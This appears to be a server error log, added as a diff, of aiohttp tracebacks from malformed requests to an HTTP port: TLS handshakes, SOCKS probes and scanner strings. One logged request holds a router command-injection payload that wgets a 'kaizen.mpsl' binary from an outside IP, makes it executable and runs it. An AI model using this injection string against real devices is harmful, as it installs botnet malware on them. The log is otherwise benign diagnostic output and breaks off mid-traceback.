+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x05\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x02b\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+kaizen.mpsl%3B+wget+http%3A%2F%2F176.65.149.168%2Fbins%2Fkaizen.mpsl%3B+chmod+777+kaizen.mpsl%3B+.%2Fkaizen.mpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1'
+                                                                                                                                                                                                                                     ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\xa6\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\xa6\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01W\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01I\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x9a\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x02\x01\x9b\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x9e\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xb5\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01\x01\xbbh\x10\xb9\xf1'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Data after `Connection: close`:
+
+    b'\x00'
+          ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
